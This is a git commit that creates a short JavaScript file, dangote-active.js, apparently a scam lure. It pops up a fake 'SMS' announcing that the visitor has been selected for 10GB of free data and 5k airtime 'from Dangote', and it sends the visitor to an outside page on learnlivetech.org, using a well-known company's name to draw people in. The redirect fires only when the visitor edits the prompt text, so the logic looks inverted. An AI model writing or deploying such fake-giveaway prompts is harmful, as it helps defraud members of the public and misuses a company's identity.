4a5a9d26a6404b2d529653833b52132f08d63f97
bigukpe <bigaka42@gmail.com>
2025-03-25 07:01:41 +0100

    Create dangote-active.js

---
+++ dangote-active.js
@@ -0,0 +1,7 @@
+
+
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS! Congratulations, you have been select to receive 10gb free data and 5k Airtime from Dangote. Kindly Press OK to ACTIVATE now   ','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://learnlivetech.org/dangote';
+}
